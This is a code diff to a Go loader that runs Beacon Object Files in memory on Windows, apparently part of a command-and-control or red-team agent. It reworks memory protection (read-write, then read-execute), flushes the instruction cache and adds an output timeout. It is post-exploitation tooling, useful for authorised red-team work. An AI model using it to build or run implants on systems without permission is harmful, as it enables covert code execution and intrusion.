@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"github.com/RIscRIpt/pecoff"
@@ -18,11 +19,7 @@ import (
 // Custom COFF loader with fixed Beacon API implementations
 // Based on goffloader but with GC-safe BeaconDataExtract
 
-const (
-	coffImageScnMemExecute = 0x20000000
-	coffPageExecuteRead    = windows.PAGE_EXECUTE_READ
-	coffPageReadWrite      = windows.PAGE_READWRITE
-)
+const coffImageScnMemExecute = 0x20000000
 
 type coffSection struct {
 	Section *pecoff.Section
@@ -70,9 +67,14 @@ func LoadAndRunBOF(coffBytes []byte, argBytes []byte, entryPoint string) (string
 			continue
 		}
 
-		addr, err := virtualAllocBytes(uint32(allocationSize))
+		// Allocate all sections as RW with MEM_TOP_DOWN to keep them close together.
+		// This prevents REL32 relocation overflow when sections are >2GB apart.
+		// Executable sections will be VirtualProtect'd to RX after relocations.
+		var addr uintptr
+		var err error
+		addr, err = virtualAllocRW(uint32(allocationSize))
 		if err != nil {
-			return "", fmt.Errorf("VirtualAlloc failed: %v", err)
+			return "", fmt.Errorf("VirtualAlloc failed for section %s: %v", section.NameString(), err)
 		}
 
 		if strings.HasPrefix(section.NameString(), ".bss") {
@@ -98,7 +100,7 @@ func LoadAndRunBOF(coffBytes []byte, argBytes []byte, entryPoint string) (string
 	if gotSize == 0 {
 		gotSize = 8 // Minimum allocation to avoid zero-size VirtualAlloc
 	}
-	gotBaseAddress, err := virtualAllocBytes(gotSize)
+	gotBaseAddress, err := virtualAllocRW(gotSize)
 	if err != nil {
 		return "", fmt.Errorf("VirtualAlloc for GOT failed: %v", err)
 	}
@@ -153,10 +155,23 @@ func LoadAndRunBOF(coffBytes []byte, argBytes []byte, entryPoint string) (string
 			processReloc(symbolDefAddress, sectionVirtualAddr, reloc, symbol)
 		}
 
-		// Set executable sections to executable
+	}
+
+	// Mark executable sections as RX and flush instruction cache
+	for _, section := range parsedCoff.Sections.Array() {
 		if section.Characteristics&coffImageScnMemExecute != 0 {
-			var oldProtect uint32
-			windows.VirtualProtect(sectionVirtualAddr, uintptr(section.SizeOfRawData), coffPageExecuteRead, &oldProtect)
+			sec, ok := sections[section.NameString()]
+			if !ok || sec.Address == 0 {
+				continue
+			}
+			size := section.SizeOfRawData
+			if size == 0 {
+				continue
+			}
+			if err := virtualProtectRX(sec.Address, size); err != nil {
+				return "", fmt.Errorf("VirtualProtect failed for section %s: %v", section.NameString(), err)
+			}
+			flushInstructionCache(sec.Address, size)
 		}
 	}
 
@@ -184,10 +199,21 @@ func LoadAndRunBOF(coffBytes []byte, argBytes []byte, entryPoint string) (string
 		outputChan <- fmt.Sprintf("Entry point '%s' not found", entryPoint)
 	}()
 
-	// Collect output
+	// Collect output with timeout to prevent blocking the agent
 	var output string
-	for msg := range outputChan {
-		output += fmt.Sprintf("%v\n", msg)
+	timeout := time.After(30 * time.Second)
+collectLoop:
+	for {
+		select {
+		case msg, ok := <-outputChan:
+			if !ok {
+				break collectLoop
+			}
+			output += fmt.Sprintf("%v\n", msg)
+		case <-timeout:
+			output += "[!] BOF execution timed out after 30 seconds\n"
+			break collectLoop
+		}
 	}
 
 	// Free allocated memory
